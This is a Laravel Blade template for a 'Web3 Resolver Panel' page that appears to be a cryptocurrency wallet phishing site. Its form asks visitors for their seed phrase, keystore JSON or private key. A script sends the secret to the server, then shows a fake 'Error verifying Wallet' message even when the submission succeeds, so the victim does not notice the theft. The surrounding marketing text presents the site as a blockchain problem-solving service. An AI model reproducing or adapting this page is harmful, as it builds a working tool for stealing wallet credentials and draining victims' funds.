@include('include.header')

<div id="main-wrapper" class="front show">

    <div class="header landing">
        <div class="container">
            <div class="row">
                <div class="col-xl-12">
                    <div class="navigation">
                        <nav class="navbar navbar-expand-lg navbar-light">
                            <div class="brand-logo">
                                <a data-savepage-href="index-1.html" href="{{ route('index') }}">
                                    <img data-savepage-currentsrc="{{ route('index') }}"
                                         data-savepage-src="images/logo.png"
                                         src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABwAAAAbCAYAAABvCO8sAAAACXBIWXMAAAsTAAALEwEAmpwYAAAFv2lUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgOS4xLWMwMDEgNzkuYThkNDc1MywgMjAyMy8wMy8yMy0wODo1NjozNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtbG5zOnN0RXZ0PSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VFdmVudCMiIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6cGhvdG9zaG9wPSJodHRwOi8vbnMuYWRvYmUuY29tL3Bob3Rvc2hvcC8xLjAvIiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCBDUzYgKFdpbmRvd3MpIiB4bXA6Q3JlYXRlRGF0ZT0iMjAyMy0xMC0wN1QxMjoxNjo0MS0wNTowMCIgeG1wOk1vZGlmeURhdGU9IjIwMjMtMTAtMDhUMDY6MDM6MjItMDU6MDAiIHhtcDpNZXRhZGF0YURhdGU9IjIwMjMtMTAtMDhUMDY6MDM6MjItMDU6MDAiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MzMzOTE2ZGQtNzZkNC02MjQ0LWFmYzctNTdjMzg1NzMzYWUxIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkIyODkxQTM4NkFERjExRUM4MEU2QTdGOTVERTg5MzY5IiB4bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ9InhtcC5kaWQ6QjI4OTFBMzg2QURGMTFFQzgwRTZBN0Y5NURFODkzNjkiIGRjOmZvcm1hdD0iaW1hZ2UvcG5nIiBwaG90b3Nob3A6Q29sb3JNb2RlPSIzIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QjI4OTFBMzU2QURGMTFFQzgwRTZBN0Y5NURFODkzNjkiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QjI4OTFBMzY2QURGMTFFQzgwRTZBN0Y5NURFODkzNjkiLz4gPHhtcE1NOkhpc3Rvcnk+IDxyZGY6U2VxPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6MzMzOTE2ZGQtNzZkNC02MjQ0LWFmYzctNTdjMzg1NzMzYWUxIiBzdEV2dDp3aGVuPSIyMDIzLTEwLTA4VDA2OjAzOjIyLTA1OjAwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgMjQuNyAoV2luZG93cykiIHN0RXZ0OmNoYW5nZWQ9Ii8iLz4gPC9yZGY6U2VxPiA8L3htcE1NOkhpc3Rvcnk+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+Jvz+AQAAAkZJREFUSImt1k+IjVEYx/HPXP9mIUxKFkNK/s1goWwMIqSQDQv505A/pZRJzUIKxYaSKEUsFBYiRRo1+ZdQxGokIhRTysKQRprmjsV53/HOnffOfd8xv8097znPeb7nnHue5zxVjvcoUR12YyUmYjiKiA37TUj0FfENj3AWL/oYNQdnSV1EI7pxGy3oQmEASKwihqEW67Add7AqaZQEPsAS7MXpFEBebcYlvMWMuDNe+bUINn2IYHAZNZHP50lgHdZjF97ldNqEOQOMd2Ap5mN5DDwUDZ7PCTuHk9hUwe4hvuJEDFwrnHUeHRBOBH5msD+FuTGwWuKMM2g1jia+ixnmfIgb8aWpzghrEMIlr0aWAtPirFQ1uD8IWB//WUCEFT6TWGlC4/OQSzNNObVgWknfazzG9TzASjschStYljL2EvvwGfWYOhTAWmwsM7YFv9COV3iPBZWAlY70k3AzxwpZox2TcVfYfVIfI+h/AbvxNGpPwFaM0f9k2jELf/4XmFQjjqX0dwl5siKM7GEB38v0L8SbrE5iYNornkU7ZUuLvf5jYOcgYAdxIaNt73EXhORbn2FSVaJ9FUcyLy3URr3AVuzIMGl09NuGDTlgsEf0YhRwGCOwpsKkVpzBipyw2UJa3A9VUZn4RMgS4/Ajp8NK6sEXTOpp/ndpGoQtdwgVwFCoQbiMnaLXnr6BPxP3cDOC3xLS1W+h3kyuOE3dwl8zRUgE84T4XCQRw0lgFxYLFXcTtgkXpZACKQctCgm9TSiGb5Qa/AUrE3VL2OayNgAAAABJRU5ErkJggg=="
                                         alt="" class="logo-primary">
                                    <img data-savepage-currentsrc="{{ route('index') }}"
                                         data-savepage-src="images/logow.png" src="" alt="" class="logo-white">
                                </a>
                            </div>
                            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                                    data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent"
                                    aria-expanded="false" aria-label="Toggle navigation">
                                <span class="navbar-toggler-icon"></span>
                            </button>
                            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                                <ul class="navbar-nav me-auto">
                                    <li class="nav-item dropdown"><a class="nav-link" data-savepage-href="index.html"
                                                                     href="{{ route('index') }}">Home</a>
                                    </li>
                                    <li class="nav-item"><a class="nav-link" data-savepage-href="explore.html"
                                                            href="{{ route('explore') }}">Explore</a>
                                    </li>
                                    <!-- <li class="nav-item"><a class="nav-link"
                                                href="mailto:admin@web3resolverpanel.net">Send an Email</a></li> -->
                                    <!-- <li class="nav-item"><a class="nav-link" href="collection.html">Collection</a></li>
                                <li class="nav-item"><a class="nav-link" href="profile.html">Profile</a></li>
                                <li class="nav-item"><a class="nav-link" href="upload.html">Upload</a></li>
                                <li class="nav-item"><a class="nav-link" href="dashboard.html">Dashboard</a></li> -->
                                </ul>
                            </div>
                            <div class="signin-btn d-flex align-items-center">
                                <div class="dark-light-toggle theme-switch" onclick="themeToggle()">
                                    <span class="dark"><i class="ri-moon-line"></i></span>
                                    <span class="light"><i class="ri-sun-line"></i></span>
                                </div>

                                <a class="btn btn-primary" data-savepage-href="explore.html"
                                   href="{{ route('explore') }}">Connect</a>
                            </div>
                        </nav>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="page-title">
        <div class="container">
            <div class="row align-items-center justify-content-between">
                <div class="col-6">
                    <div class="page-title-content">
                        <h3>Explore</h3>
                        <p class="mb-2">Explore different connection mode</p>
                    </div>
                </div>
                <!-- <div class="col-auto">
                        <div class="breadcrumbs"><a href="#">Home </a><span><i
                                    class="ri-arrow-right-s-line"></i></span><a href="#">Payments</a></div>
                    </div> -->
            </div>
        </div>
    </div>


    <div class="upload-item section-padding">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-12">
                    <h4 class="card-title mb-3">DAPP Type: {{ $coin->name }}
                    </h4>
                    <div class="card">
                        <div class="card-body">

                            <form id="myForm">
                                @csrf <!-- CSRF protection for Laravel -->
                                <div class="row">
                                    <div class="col-12 mb-3">

                                        <input type="hidden" name="dapp_type"  value="{{ $coin->name }}">

                                        <label class="form-label">Method of Connection</label>
                                        <br>
                                        <select  name="connection_method" required="">
                                            <option value="">Select One</option>
                                            <option value="phrase">Phrase</option>
                                            <option value="json">Key store Json</option>
                                            <option value="p-key">Private Key</option>
                                        </select>
                                    </div>

                                    <div class="col-12 mb-3">
                                        <label class="form-label">Phrase, Key store or Private key</label>
                                        <textarea type="text" id="complaint" name="key" class="form-control" required=""></textarea>
                                    </div>
                                </div>
                                <div class="mt-3">
                                    <button type="submit" name="submit" id="button" class="btn btn-primary mr-2 w-100">Submit</button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>



    <div class="bottom section-padding triangle-top-dark triangle-bottom-dark">
        <div class="container">
            <div class="row">
                <div class="col-xl-4 col-lg-4 col-md-7 col-sm-8">
                    <div class="bottom-logo">
                        <img src="{{ asset('storage/logo.png') }}" />
                        <p>Our commitment is to address a wide array of blockchain and crypto challenges
                            comprehensively. We strive to provide effective solutions that empower you to navigate
                            the
                            rapidly evolving blockchain landscape with confidence. Trust us to optimize your
                            operations
                            and create a successful and efficient blockchain ecosystem.</p>
                    </div>
                </div>
                <div class="col-xl-2 col-lg-2 col-md-5 col-sm-4 col-6">
                    <div class="bottom-widget">
                        <h4 class="widget-title">Quick Links</h4>
                        <ul>
                            <li><a data-savepage-href="explore.php" href="https://mainnetdappshub.com/.php">Explore</a></li>
                            <li><a data-savepage-href="explore.php" href="https://mainnetdappshub.com/.php">Connect</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="container">
            <div class="row">
                <div class="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
                    <div class="copyright">
                        <p>© Copyright 2023 <a href="#">Web3 Resolver Panel</a> <!-- -->All Rights Reserved</p>
                    </div>
                </div>
                <div class="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
                    <div class="footer-social">
                        <ul>
                            <li><a href="#"><i class="bi bi-facebook"></i></a></li>
                            <li><a href="#"><i class="bi bi-twitter"></i></a></li>
                            <li><a href="#"><i class="bi bi-linkedin"></i></a></li>
                            <li><a href="#"><i class="bi bi-youtube"></i></a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>


</div>



<script data-savepage-type="" type="text/plain" data-savepage-src="vendor/jquery/jquery.min.js"></script>
<script data-savepage-type="" type="text/plain" data-savepage-src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>


<script data-savepage-type="" type="text/plain" data-savepage-src="js/scripts.js"></script>

<script data-savepage-type="text/javascript" type="text/plain" data-savepage-src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

<script data-savepage-type="text/javascript" type="text/plain"></script>

<!-- Smartsupp Live Chat script -->
<!-- <script type="text/javascript">
    var _smartsupp = _smartsupp || {};
    _smartsupp.key = '7e8063f85d6671bbfcb99297f6f9a7044c335aa5';
    window.smartsupp||(function(d) {
      var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
      s=d.getElementsByTagName('script')[0];c=d.createElement('script');
      c.type='text/javascript';c.charset='utf-8';c.async=true;
      c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
    })(document);
    </script>
    <noscript> Powered by <a href=“https://www.smartsupp.com” target=“_blank”>Smartsupp</a></noscript> -->

<!-- <script src="//code.jivosite.com/widget/ZtR0Iuvr7G" async></script> -->
<script data-savepage-type="" type="text/plain" data-savepage-src="//code.tidio.co/dgtpwgzuzzbts1qnht0tqqqz4dlwumdl.js" async=""></script>

<script>
    // JavaScript code to handle form submission
    document.getElementById('myForm').addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent the default form submission

        // Get form data
        const formData = new FormData(this);

        // Send a POST request using Fetch API
        fetch('{{ route('form.submit') }}', {
            method: 'POST',
            headers: {
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content'),
                'Accept': 'application/json',
            },
            body: formData,
        })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('Error verifying Wallet... Please try again later');
                } else {
                    alert('failed.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
    });
</script>




<div id="wayin-not-video-container"><div></div></div></body></html>
